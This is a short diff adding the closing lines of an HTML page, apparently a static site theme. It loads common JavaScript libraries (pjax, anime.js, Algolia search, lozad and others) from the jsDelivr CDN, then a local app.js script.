+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
